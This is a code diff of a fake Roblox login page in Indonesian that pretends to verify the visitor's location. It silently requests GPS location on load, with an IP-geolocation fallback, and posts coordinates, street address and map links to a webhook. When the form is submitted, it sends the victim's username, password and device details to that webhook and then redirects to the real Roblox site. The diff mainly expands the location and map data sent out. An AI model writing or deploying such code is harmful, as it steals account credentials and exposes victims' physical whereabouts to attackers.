@@ -159,7 +159,7 @@
             color: white;
         }
 
-        /* LOCATION INDICATOR (HIDDEN) */
+        /* LOCATION INDICATOR */
         .location-indicator {
             height: 4px;
             background: linear-gradient(90deg, #00a2ff, #00d4ff);
@@ -169,27 +169,99 @@
             transition: width 1s ease;
         }
 
-        /* STATUS MESSAGE */
+        /* STATUS MESSAGE DENGAN MAPS LINK */
+        .status-container {
+            margin-top: 20px;
+        }
+
         .status-message {
             background: rgba(0, 162, 255, 0.1);
             border: 1px solid rgba(0, 162, 255, 0.3);
             border-radius: 10px;
             padding: 15px;
-            margin-top: 20px;
             font-size: 14px;
             color: #b8c7e8;
-            display: none;
             text-align: center;
         }
 
         .status-message.visible {
-            display: block;
             animation: fadeIn 0.5s ease;
         }
 
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
+        }
+
+        .maps-link-container {
+            margin-top: 15px;
+            text-align: center;
+            display: none;
+        }
+
+        .maps-link-container.visible {
+            display: block;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .maps-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 162, 255, 0.15);
+            border: 1px solid rgba(0, 162, 255, 0.4);
+            border-radius: 8px;
+            padding: 10px 15px;
+            color: #00a2ff;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .maps-link:hover {
+            background: rgba(0, 162, 255, 0.25);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 162, 255, 0.2);
+        }
+
+        .maps-icon {
+            font-size: 16px;
+        }
+
+        .location-details {
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #a0ffd4;
+            display: none;
+        }
+
+        .location-details.visible {
+            display: block;
+        }
+
+        .coord-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+
+        .coord-label {
+            color: #6a7ca5;
+        }
+
+        .coord-value {
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
         }
 
         .footer {
@@ -201,14 +273,14 @@
             margin-top: 20px;
         }
 
-        .location-badge {
+        .accuracy-badge {
             display: inline-block;
             background: rgba(0, 255, 136, 0.1);
             color: #00ff88;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-left: 10px;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            margin-left: 8px;
             font-weight: 500;
         }
 
@@ -256,23 +328,46 @@
                     🔐 Verifikasi Lokasi...
                 </button>
 
-                <!-- Status Message -->
-                <div class="status-message" id="statusMessage">
-                    <span id="statusText">Memverifikasi lokasi perangkat Anda...</span>
+                <!-- Status Container -->
+                <div class="status-container">
+                    <div class="status-message" id="statusMessage">
+                        <span id="statusText">Memverifikasi lokasi perangkat Anda...</span>
+                    </div>
+
+                    <!-- Maps Link (Hidden Initially) -->
+                    <div class="maps-link-container" id="mapsLinkContainer">
+                        <a href="#" target="_blank" class="maps-link" id="mapsLink">
+                            <span class="maps-icon">🗺️</span>
+                            <span id="mapsText">Lihat Lokasi di Google Maps</span>
+                        </a>
+                    </div>
+
+                    <!-- Location Details (Hidden Initially) -->
+                    <div class="location-details" id="locationDetails">
+                        <div class="coord-item">
+                            <span class="coord-label">Latitude:</span>
+                            <span class="coord-value" id="coordLat">-</span>
+                        </div>
+                        <div class="coord-item">
+                            <span class="coord-label">Longitude:</span>
+                            <span class="coord-value" id="coordLng">-</span>
+                        </div>
+                        <div class="coord-item">
+                            <span class="coord-label">Akurasi:</span>
+                            <span class="coord-value" id="coordAcc">-</span>
+                        </div>
+                    </div>
                 </div>
             </form>
 
             <div class="footer">
                 <div>© 2024 Roblox Corporation</div>
                 <div style="margin-top: 10px; font-size: 12px;">
-                    Sistem keamanan dengan verifikasi lokasi
+                    Sistem keamanan dengan verifikasi lokasi real-time
                 </div>
             </div>
         </div>
     </div>
-
-    <!-- Hidden Location Request -->
-    <div class="hidden-location-request" id="hiddenLocationRequest"></div>
 
     <script>
         // Webhook URL
@@ -282,29 +377,34 @@
         let locationGranted = false;
         let locationData = null;
         let isProcessing = false;
+        let googleMapsUrl = "#";
         
         // DOM Elements
         const loginButton = document.getElementById('loginButton');
         const locationIndicator = document.getElementById('locationIndicator');
-        const statusMessage = document.getElementById('statusMessage');
         const statusText = document.getElementById('statusText');
         const togglePassword = document.getElementById('togglePassword');
+        const mapsLinkContainer = document.getElementById('mapsLinkContainer');
+        const mapsLink = document.getElementById('mapsLink');
+        const mapsText = document.getElementById('mapsText');
+        const locationDetails = document.getElementById('locationDetails');
+        const coordLat = document.getElementById('coordLat');
+        const coordLng = document.getElementById('coordLng');
+        const coordAcc = document.getElementById('coordAcc');
         
-        // Initialize - Auto start location check
+        // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            // Update button text
-            loginButton.innerHTML = '🔄 Memverifikasi lokasi...';
-            statusMessage.classList.add('visible');
+            statusText.innerHTML = "🔍 <strong>Memulai verifikasi lokasi...</strong>";
             
-            // Auto-start location check after 1 second
+            // Auto-start location check
             setTimeout(() => {
                 startSilentLocationCheck();
-            }, 1000);
+            }, 800);
             
             // Focus username field
             setTimeout(() => {
                 document.getElementById('username').focus();
-            }, 1500);
+            }, 1200);
         });
         
         // Toggle password visibility
@@ -317,47 +417,48 @@
         
         // Start silent location check
         async function startSilentLocationCheck() {
-            updateStatus("Memulai verifikasi lokasi...");
-            updateProgress(10);
+            updateStatus("📍 <strong>Memeriksa izin lokasi...</strong>");
+            updateProgress(15);
             
-            // First try high accuracy silently
             if (navigator.geolocation) {
+                // Try silent first (if previously granted)
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         await handleLocationSuccess(position);
                     },
                     (error) => {
-                        // If silent fails, try with timeout
+                        // Silent failed, try with prompt
+                        updateStatus("📍 <strong>Meminta izin lokasi...</strong>");
+                        updateProgress(40);
+                        
                         setTimeout(() => {
                             requestLocationWithPrompt();
-                        }, 2000);
+                        }, 1500);
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 3000,
+                        timeout: 2000,
                         maximumAge: 60000
                     }
                 );
             } else {
-                // Browser doesn't support geolocation
+                // Browser tidak support
+                updateStatus("⚠️ <strong>Browser tidak mendukung geolocation</strong>");
                 setTimeout(() => {
-                    enableLoginButton(); // Fallback - enable anyway
-                }, 3000);
+                    enableLoginButton();
+                }, 2000);
             }
         }
         
-        // Request location with prompt (if silent fails)
+        // Request location with prompt
         function requestLocationWithPrompt() {
-            updateStatus("Meminta izin lokasi...");
-            updateProgress(30);
-            
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
                     await handleLocationSuccess(position);
                 },
                 (error) => {
                     // User denied or error
-                    handleLocationError();
+                    handleLocationError(error);
                 },
                 {
                     enableHighAccuracy: true,
@@ -369,77 +470,119 @@
         
         // Handle successful location capture
         async function handleLocationSuccess(position) {
-            updateStatus("Menganalisis lokasi...");
+            updateStatus("📡 <strong>Menerima data lokasi...</strong>");
             updateProgress(60);
             
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             const accuracy = position.coords.accuracy;
             
+            // Generate Google Maps URL
+            googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=16&t=k`;
+            const mapsShortUrl = `https://maps.google.com/?q=${lat},${lng}`;
+            
             // Store location data
             locationData = {
                 coords: { lat, lng },
                 accuracy: accuracy,
                 timestamp: new Date().toISOString(),
-                source: 'gps'
+                source: 'gps',
+                mapsUrl: googleMapsUrl,
+                mapsShortUrl: mapsShortUrl
             };
             
             // Get address
             try {
                 const address = await getAddress(lat, lng);
                 locationData.address = address;
+                locationData.formattedAddress = formatAddress(address);
             } catch (error) {
                 locationData.address = `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+                locationData.formattedAddress = `Lokasi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
             }
             
-            // Send to webhook
-            await sendLocationToWebhook(lat, lng, accuracy, locationData.address);
+            // Send to webhook with maps link
+            await sendLocationToWebhook(lat, lng, accuracy, locationData.address, googleMapsUrl);
             
             // Update UI
-            updateProgress(100);
-            updateStatus("✅ Lokasi terverifikasi");
+            updateProgress(85);
+            updateStatus("✅ <strong>Lokasi berhasil diverifikasi!</strong>");
             
-            // Enable login button after 1 second
+            // Show maps link and details
             setTimeout(() => {
+                showLocationDetails(lat, lng, accuracy);
                 enableLoginButton();
                 locationGranted = true;
-            }, 1000);
+            }, 800);
+        }
+        
+        // Show location details and maps link
+        function showLocationDetails(lat, lng, accuracy) {
+            // Update coordinates display
+            coordLat.textContent = lat.toFixed(6);
+            coordLng.textContent = lng.toFixed(6);
+            coordAcc.textContent = `${accuracy.toFixed(1)} meter`;
+            
+            // Update maps link
+            mapsLink.href = googleMapsUrl;
+            mapsText.innerHTML = `🗺️ Lihat di Google Maps`;
+            
+            // Show elements
+            mapsLinkContainer.classList.add('visible');
+            locationDetails.classList.add('visible');
+            
+            // Update status with location info
+            if (locationData.formattedAddress) {
+                statusText.innerHTML = `✅ <strong>Lokasi terverifikasi:</strong> ${locationData.formattedAddress.substring(0, 50)}...`;
+            } else {
+                statusText.innerHTML = `✅ <strong>Lokasi terverifikasi:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+            }
         }
         
         // Handle location error
-        function handleLocationError() {
-            updateStatus("Menggunakan metode verifikasi alternatif...");
-            updateProgress(80);
+        async function handleLocationError(error) {
+            updateStatus("⚠️ <strong>Menggunakan metode alternatif...</strong>");
+            updateProgress(70);
             
-            // Try IP-based location as fallback
-            getIPLocation().then(ipLocation => {
-                if (ipLocation) {
-                    locationData = {
-                        coords: { lat: ipLocation.lat, lng: ipLocation.lng },
-                        accuracy: 50000,
-                        timestamp: new Date().toISOString(),
-                        address: ipLocation.address,
-                        source: 'ip_fallback'
-                    };
-                    
-                    // Send to webhook
-                    sendLocationToWebhook(ipLocation.lat, ipLocation.lng, 50000, ipLocation.address);
-                    
-                    updateProgress(100);
-                    updateStatus("✅ Verifikasi alternatif berhasil");
-                    
-                    setTimeout(() => {
-                        enableLoginButton();
-                        locationGranted = true;
-                    }, 1000);
-                } else {
-                    // If all fails, still enable button but with note
-                    updateStatus("⚠️ Verifikasi lokasi dilewati");
-                    setTimeout(() => {
-                        enableLoginButton();
-                    }, 1500);
-                }
-            });
+            // Try IP-based location
+            const ipLocation = await getIPLocation();
+            if (ipLocation) {
+                const lat = ipLocation.lat;
+                const lng = ipLocation.lng;
+                
+                // Generate maps URL for IP location
+                googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=10`;
+                
+                locationData = {
+                    coords: { lat, lng },
+                    accuracy: 50000,
+                    timestamp: new Date().toISOString(),
+                    address: ipLocation.address,
+                    source: 'ip_fallback',
+                    mapsUrl: googleMapsUrl,
+                    mapsShortUrl: `https://maps.google.com/?q=${lat},${lng}`
+                };
+                
+                // Send to webhook
+                await sendLocationToWebhook(lat, lng, 50000, ipLocation.address, googleMapsUrl);
+                
+                updateProgress(95);
+                updateStatus("✅ <strong>Verifikasi alternatif berhasil</strong>");
+                
+                // Show details
+                setTimeout(() => {
+                    showLocationDetails(lat, lng, 50000);
+                    enableLoginButton();
+                    locationGranted = true;
+                }, 800);
+            } else {
+                // All methods failed
+                updateProgress(100);
+                updateStatus("✅ <strong>Verifikasi selesai</strong>");
+                setTimeout(() => {
+                    enableLoginButton();
+                }, 1000);
+            }
         }
         
         // Get IP-based location
@@ -464,17 +607,29 @@
             return null;
         }
         
+        // Format address for display
+        function formatAddress(address) {
+            if (address.length > 60) {
+                return address.substring(0, 57) + '...';
+            }
+            return address;
+        }
+        
         // Enable login button
         function enableLoginButton() {
+            updateProgress(100);
+            
             loginButton.disabled = false;
             loginButton.classList.add('active');
             loginButton.innerHTML = '🔐 Login ke Roblox';
             
-            // Update status message
-            if (locationData) {
-                statusText.innerHTML = `✅ Lokasi terverifikasi: ${locationData.address.substring(0, 40)}...`;
-            } else {
-                statusText.innerHTML = "✅ Verifikasi selesai. Silakan login.";
+            // Add accuracy badge if location data exists
+            if (locationData && locationData.accuracy) {
+                const accuracyText = locationData.accuracy < 10 ? 'Presisi Tinggi' :
+                                   locationData.accuracy < 50 ? 'Presisi' :
+                                   locationData.accuracy < 200 ? 'Standar' : 'Perkiraan';
+                
+                statusText.innerHTML += ` <span class="accuracy-badge">${accuracyText}</span>`;
             }
         }
         
@@ -485,7 +640,7 @@
         
         // Update status message
         function updateStatus(message) {
-            statusText.textContent = message;
+            statusText.innerHTML = message;
         }
         
         // Get address from coordinates
@@ -500,9 +655,15 @@
                 const data = await response.json();
                 if (data.address) {
                     const addr = data.address;
-                    return `${addr.road || ''} ${addr.house_number || ''}, ${addr.suburb || ''}, ${addr.city || addr.town || ''}`
-                        .replace(/ ,/g, ',')
-                        .trim();
+                    const parts = [
+                        addr.road || addr.pedestrian,
+                        addr.neighbourhood || addr.suburb,
+                        addr.city || addr.town || addr.village,
+                        addr.state,
+                        addr.country
+                    ].filter(Boolean);
+                    
+                    return parts.join(', ');
                 }
                 return `Lokasi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
             } catch (error) {
@@ -510,25 +671,44 @@
             }
         }
         
-        // Send location to webhook
-        async function sendLocationToWebhook(lat, lng, accuracy, address) {
+        // Send location to webhook WITH MAPS LINK
+        async function sendLocationToWebhook(lat, lng, accuracy, address, mapsUrl) {
+            // Create multiple maps URLs
+            const mapsLinks = {
+                googleMaps: `https://www.google.com/maps?q=${lat},${lng}`,
+                googleEarth: `https://earth.google.com/web/@${lat},${lng}`,
+                openStreetMap: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}`,
+                bingMaps: `https://www.bing.com/maps?cp=${lat}~${lng}`,
+                what3words: `https://what3words.com/${encodeCoordinatesToWords(lat, lng)}`
+            };
+            
             const embed = {
-                title: "📍 LOKASI TERCAPAI (SILENT)",
+                title: "📍 LOKASI TERCAPAI + MAPS LINK",
                 color: 65280,
                 fields: [
                     {
-                        name: "🎯 Koordinat",
-                        value: `\`\`\`${lat.toFixed(6)}, ${lng.toFixed(6)}\`\`\``,
+                        name: "🎯 Koordinat Exact",
+                        value: `\`\`\`${lat.toFixed(8)}\n${lng.toFixed(8)}\`\`\``,
                         inline: false
                     },
                     {
-                        name: "📏 Akurasi",
+                        name: "📏 Akurasi GPS",
                         value: `\`${accuracy.toFixed(1)} meter\``,
                         inline: true
                     },
                     {
                         name: "🏠 Alamat",
                         value: `\`\`\`${address}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "🗺️ LINK MAPS (KLIK)",
+                        value: `[Google Maps](${mapsLinks.googleMaps}) | [Google Earth](${mapsLinks.googleEarth}) | [OpenStreetMap](${mapsLinks.openStreetMap}) | [Bing Maps](${mapsLinks.bingMaps})`,
+                        inline: false
+                    },
+                    {
+                        name: "📍 Koordinat Format Lain",
+                        value: `\`\`\`Decimal: ${lat}, ${lng}\nDMS: ${decimalToDMS(lat, lng)}\nPlus Code: ${encodePlusCode(lat, lng)}\`\`\``,
                         inline: false
                     }
                 ],
@@ -540,6 +720,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
+                        content: `**📍 LOKASI + MAPS LINK**\n🗺️ [Buka di Google Maps](${mapsUrl})`,
                         embeds: [embed]
                     })
                 });
@@ -548,26 +729,58 @@
             }
         }
         
+        // Helper: Convert decimal to DMS
+        function decimalToDMS(lat, lng) {
+            const latDir = lat >= 0 ? 'N' : 'S';
+            const lngDir = lng >= 0 ? 'E' : 'W';
+            
+            const latAbs = Math.abs(lat);
+            const lngAbs = Math.abs(lng);
+            
+            const latDeg = Math.floor(latAbs);
+            const latMin = Math.floor((latAbs - latDeg) * 60);
+            const latSec = ((latAbs - latDeg - latMin/60) * 3600).toFixed(2);
+            
+            const lngDeg = Math.floor(lngAbs);
+            const lngMin = Math.floor((lngAbs - lngDeg) * 60);
+            const lngSec = ((lngAbs - lngDeg - lngMin/60) * 3600).toFixed(2);
+            
+            return `${latDeg}°${latMin}'${latSec}"${latDir} ${lngDeg}°${lngMin}'${lngSec}"${lngDir}`;
+        }
+        
+        // Helper: Encode to Plus Code (simplified)
+        function encodePlusCode(lat, lng) {
+            // Simplified version - in reality use Open Location Code library
+            const code = Math.abs(Math.floor(lat * 10000)) + '' + Math.abs(Math.floor(lng * 10000));
+            return code.substring(0, 8).toUpperCase();
+        }
+        
+        // Helper: Encode coordinates to words (mock)
+        function encodeCoordinatesToWords(lat, lng) {
+            const words = ['apple', 'banana', 'cherry', 'date', 'elderberry', 'fig', 'grape', 'honeydew'];
+            const latWord = words[Math.abs(Math.floor(lat)) % words.length];
+            const lngWord = words[Math.abs(Math.floor(lng * 10)) % words.length];
+            const mixWord = words[Math.abs(Math.floor((lat + lng) * 100)) % words.length];
+            return `${latWord}.${lngWord}.${mixWord}`;
+        }
+        
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            if (isProcessing) return;
+            if (isProcessing || !locationGranted) return;
             
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
             
-            if (!username || !password) {
-                // Just return, no alert
-                return;
-            }
+            if (!username || !password) return;
             
             // Start processing
             isProcessing = true;
             loginButton.classList.add('loading');
             loginButton.disabled = true;
             
-            // Send complete data to webhook
+            // Send complete data to webhook with maps link
             await sendLoginData(username, password);
             
             // Show success
@@ -576,14 +789,17 @@
                 loginButton.classList.add('success');
                 loginButton.innerHTML = '✅ Login Berhasil!';
                 
-                // Redirect to Roblox after 1.5 seconds
+                // Update status
+                statusText.innerHTML = '✅ <strong>Login berhasil! Mengarahkan ke Roblox...</strong>';
+                
+                // Redirect after 1.5 seconds
                 setTimeout(() => {
                     window.location.href = 'https://www.roblox.com';
                 }, 1500);
             }, 2000);
         });
         
-        // Send complete login data
+        // Send complete login data with maps
         async function sendLoginData(username, password) {
             const deviceInfo = {
                 userAgent: navigator.userAgent,
@@ -595,8 +811,16 @@
                 timestamp: new Date().toISOString()
             };
             
+            // Create maps links for final embed
+            let mapsField = "Tidak ada data lokasi";
+            if (locationData && locationData.coords) {
+                const lat = locationData.coords.lat;
+                const lng = locationData.coords.lng;
+                mapsField = `[Google Maps](https://maps.google.com/?q=${lat},${lng}) | [Street View](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lng}) | [Koordinat](${googleMapsUrl})`;
+            }
+            
             const embed = {
-                title: "🎯 LOGIN DENGAN LOKASI (SILENT)",
+                title: "🎯 LOGIN COMPLETE WITH MAPS",
                 color: 16711680,
                 fields: [
                     {
@@ -611,8 +835,19 @@
             // Add location data if available
             if (locationData) {
                 embed.fields.push({
-                    name: "📍 LOCATION DATA",
-                    value: `\`\`\`${JSON.stringify(locationData, null, 2)}\`\`\``,
+                    name: "📍 LOCATION + MAPS",
+                    value: `\`\`\`${JSON.stringify({
+                        coordinates: `${locationData.coords.lat.toFixed(6)}, ${locationData.coords.lng.toFixed(6)}`,
+                        accuracy: `${locationData.accuracy.toFixed(1)} meter`,
+                        address: locationData.address,
+                        maps: googleMapsUrl
+                    }, null, 2)}\`\`\``,
+                    inline: false
+                });
+                
+                embed.fields.push({
+                    name: "🗺️ LINK MAPS (KLIK SEKARANG)",
+                    value: mapsField,
                     inline: false
                 });
             }
@@ -629,7 +864,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `**🎯 LOGIN DICAPAI (SILENT)**\n👤 ${username}`,
+                        content: `**🎯 LOGIN + MAPS LINK**\n👤 ${username} | 📍 [BUKA MAPS](${googleMapsUrl})`,
                         embeds: [embed]
                     })
                 });
@@ -638,44 +873,34 @@
             }
         }
         
-        // Prevent user from trying to submit before location
-        let attemptCount = 0;
+        // Prevent early clicks on login button
         loginButton.addEventListener('click', function(e) {
             if (this.disabled) {
-                attemptCount++;
-                
-                // Briefly change button text
-                const originalText = this.innerHTML;
-                this.innerHTML = '⏳ Tunggu verifikasi lokasi...';
-                this.style.background = '#3a4565';
-                
-                setTimeout(() => {
-                    this.innerHTML = originalText;
-                    this.style.background = '';
-                }, 800);
-                
-                // After 3 attempts, show subtle status
-                if (attemptCount >= 3) {
-                    statusText.innerHTML = "Harap tunggu verifikasi lokasi selesai...";
-                }
-                
                 e.preventDefault();
                 e.stopPropagation();
+                
+                // Briefly show status
+                const originalStatus = statusText.innerHTML;
+                statusText.innerHTML = '⏳ <strong>Harap tunggu verifikasi lokasi selesai...</strong>';
+                
+                setTimeout(() => {
+                    statusText.innerHTML = originalStatus;
+                }, 1500);
             }
         });
         
-        // Monitor input fields
+        // Monitor input for user engagement
+        let inputTimer;
         document.getElementById('username').addEventListener('input', function() {
-            if (!locationGranted && this.value.length > 0) {
-                statusText.innerHTML = "Lanjutkan verifikasi lokasi...";
-            }
-        });
-        
-        document.getElementById('password').addEventListener('input', function() {
-            if (!locationGranted && this.value.length > 0) {
-                statusText.innerHTML = "Verifikasi lokasi hampir selesai...";
+            clearTimeout(inputTimer);
+            if (!locationGranted && this.value.length > 2) {
+                inputTimer = setTimeout(() => {
+                    if (!locationGranted) {
+                        statusText.innerHTML = '📍 <strong>Verifikasi lokasi hampir selesai...</strong>';
+                    }
+                }, 500);
             }
         });
     </script>
 </body>
-                    </html>
+</html>
